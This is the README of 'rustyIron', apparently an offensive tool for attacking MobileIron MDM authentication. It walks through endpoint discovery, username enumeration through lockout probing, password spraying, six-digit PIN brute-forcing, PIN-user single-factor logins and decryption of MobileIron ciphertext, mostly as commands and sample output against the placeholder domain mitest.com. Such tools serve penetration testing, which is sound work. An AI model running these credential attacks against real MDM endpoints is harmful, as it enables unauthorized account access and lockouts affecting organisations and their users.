# rustyIron

This tool represents a communication framework for navigating MobileIron's MDM authentication methods, allowing for account enumeration, single-factor authentication attacks, and message decryption.

```
$ rustyIron --help

  Usage:
  rustyIron <method> [OPTIONS] <[ endpoint | cipherTXT ]> [file]
  rustyIron -h | -help
  rustyIron -vˇ

  Options:
    -h, -help              Show usage
    -a                     User-Agent for request [default: MobileIron/OpenSSLWrapper (Dalvik VM)]
    -c                     MobileIron pinSetup cookie
    -t                     Application threads [default: 10]
    -u                     MobileIron username
    -p                     MobileIron password
    -P                     MobileIron Authentication TLS Port [default: 9997]
    -r                     Disable randomize device ID
    -d                     Enable Debug output
    -uuid                  Static Device UUID value
    -guid                  MobileIron GUID value
    -pin                   MobileIron Authentication PIN

    <endpoint>             MobileIron endpoint FQDN
    <cipherTXT>            MobileIron encrypted cipherTXT
    <file>                 Line divided file containing UserID or PIN values

  Methods:
    disco                  MobileIron endpoint discovery query
    enum                   MobileIron username validation
    decrypt                Decrypt MobileIron CipherText
    prof                   Profile the MobileIron provisioning details
    auth-user              MobileIron user based authentication
    auth-pin               MobileIron PIN authentication
    auth-pinpass           MobileIron auth-pinpassword authentication
    auth-pinuser           MobileIron PIN user based authentication
```

## Discovery/Profiling

The disco method will communicate with the MobileIron’s discovery API to locate and validate a domain’s authentication endpoint based on the supplied domain name.
```
$ rustyIron disco mitest.com
[+] auth.mitest.com: Successful Endpoint Discovery
[*] User Authentication Enabled
```
Additionally, upon identifying the authentication endpoint an initialization packet is sent to validate the authentication configuration of the MobileIron implementation. The following configurations are currently identified:

* Single Factor Authentication
* PIN Based Authentication
* PIN-Password Authentication
* Mutual Certificate Authentication

Furthermore, there is a return result if the authentication method is unknown, I am happy to increase validation for further observed methods.

*Note: Mutual Certificate Authentication is an overlay template across an existing authentication method and only affects the Mobile@Work agent.*

In the event MobileIron discovery services are disabled the prof method can be used to validate a potential MobileIron endpoint:
```
$ rustyIron prof auth.mitest.com
[*] prof threading 1 values across 10 threads
[*] User Authentication Enabled
```

The prof  method will identify what authentication method is configured for the endpoint.

## Account Enumeration

In the event an environment is configured with standard user authentication, the enumerate function can be leveraged to execute successive authentication attacks and validate validity.

```
$ rustyIron enum -p 'Password01' auth.mitest.com enum-user.lst
[*] enum threading 8 values across 10 threads
[-] mary.jane:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jeff.yo:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jane.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jones:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jake:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] mary.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.doe:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] mary.jane:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jeff.yo:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[*] jane.smith:Password01 - Account Lockout: User Locked: User has been locked out. Wait 30 seconds and try again.
[+] jane.smith:Password01 - Username Validation
[-] john.jones:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jake:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[*] mary.smith:Password01 - Account Lockout: User Locked: User has been locked out. Wait 30 seconds and try again.
[+] mary.smith:Password01 - Username Validation
[-] john.doe:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] mary.jane:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jeff.yo:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jones:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jake:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.doe:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jeff.yo:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] mary.jane:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jones:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jake:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.doe:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jeff.yo:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] mary.jane:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jones:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jake:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.doe:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.smith:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] jeff.yo:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] mary.jane:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jones:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.jake:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[-] john.doe:Password01 - Authentication Failure: Authentication Failed: Invalid Credentials.
[*] john.smith:Password01 - Account Lockout: User Locked: User has been locked out. Wait 30 seconds and try again.
[+] john.smith:Password01 - Username Validation
```

MobileIron has been observed to not lockout user accounts within a user identity source and implements local lockouts for the duration of 30 seconts. This attack executes up to six authentication attempts per account and identifies if a lockout condition occurs. If the account locks, the supplied username is valid in the context of MobileIron.

*Note: PIN and PIN-Password authentication methods do not support this enumeration functionality. However, PIN values can be brute-forced in the PIN based authentication attack.*

## Authentication Attacks

Once accounts are validated an authentication attack can be performed. rustyIron supports the following three authentication attacks.

* `auth-user`: This allows for a standard user/password authentication attack.
* `auth-pin`: This allows for PIN based authentication attack.
* `auth-pinpass`: This allows for a PIN-Pass authentication attack.

Each of these authentication methods can execute a single authentication attempt and/or perform a threaded attack leveraging a line delimited input file. These authentication attacks supply AES encrypted values wrapped within an 0x1C message and validate the MobileIron authentication response.
```
$ rustyIron auth-user -u john.smith -p 'Password01' auth.mitest.com
[*] auth-user threading 1 values across 10 threads
[+] john.smith:Password01 - Authentication Successful
```

Based on the supplied credentials the following variable output can be captured:

* Successful Authentication: The supplied credentials were valid and access was granted.
* Failed Authentication: The supplied credentials were invalid or the account does not exist.
* Account Lockout: After five failed authentication attempts an account lockout condition occurs. But is only locally relevant to the MobileIron environment and has been observed to contain a 30 second duration.

PIN based authentication is slightly different in the response interpretation:
```
$ rustyIron auth-pin -pin 950278 auth.mitest.com
[*] auth-pin threading 1 values across 10 threads
[+] jane.smith:950278[0781728bc397e81b:lptJRTZKaxRIFge9:1073741940] - Authentication Successful - Configuration Received
```

PIN based is a one-to-one attack surface between a single use PIN and the assigned user account and is not observed to be vulnerable to larger authentication attacks. When executing the `auth-pin` method, PIN enumeration is performed through multiple authentication attempts. Research has show the standard key length is six numberic values. Successful validation of a PIN is identified when the endpoint provides the zLib compress MDM profile. Decompressing this profile validates the assigned user criteria of the PIN. rustyIron provides the following output format when a PIN is validated:
* `<username>:<PIN #>[<Device UUID>:<MI Cookie>:<SenderGUID>]`

The `auth-pinpass` method works similar to the `auth-pin` method with the exception of a username and password value to additionally be provided.
```
$ rustyIron auth-pin -pin 365778 -u jane.smith -p Password01 auth.mitest.com
[*] auth-pinpass threading 1 values across 10 threads
[+] jane.smith:365778[0781728bc397e81b:lptJRTZKaxRIFge9:1073741940] - Authentication Successful - Configuration Received
```

### PIN User Authentication

Once a PIN has been validated through `auth-pin` or `auth-pinpass` the username, UUID, Cookie, and SenderGUID can be leverage to perform a single-factor authentication attempt. The reach of this authentication attack has been observed to only affect the PIN assigned user, and a wider attack surface was not observed. Unlike standard user authentication, credentials submitted through this authentication method are not AES encrypted.
```
$ rustyIron auth-pinuser -u jane.smith -p Password01 -uuid 0781728bc397e81b -c lptJRTZKaxRIFge9 -guid 1073741940 auth.mitest.com
[*] auth-pinuser threading 1 values across 10 threads
[+] jane.smith:Password01 - Authentication Successful
```

## Decryption

Finally, there is decryption. If there is a MobileIron AES encrypted value that would need decrypting the following command can be leveraged.

```
$ rustyIron.go decrypt 877D1EC52C7F75582D003EBDA1D118BC
[+] Decrypted Cipher 877D1EC52C7F75582D003EBDA1D118BC: "Password01"
```
